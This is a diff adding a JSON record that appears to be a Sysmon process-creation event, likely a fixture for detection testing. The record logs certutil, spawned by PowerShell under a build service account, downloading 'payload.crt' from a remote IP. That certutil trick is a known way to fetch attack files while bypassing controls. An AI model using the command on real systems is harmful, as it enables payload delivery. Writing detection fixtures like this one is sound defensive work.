@@ -1,0 +1,10 @@
+{
+  "EventID": 1,
+  "UtcTime": "2026-08-03 11:05:37.882",
+  "Computer": "WKSTN-021",
+  "User": "CORP\\svc-build",
+  "Image": "C:\\Windows\\System32\\certutil.exe",
+  "CommandLine": "certutil -verifyctl -f -split http://203.0.113.44/payload.crt",
+  "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "ProcessGuid": "{a1b2c3d4-0002-0000-0000-000000000002}"
+}
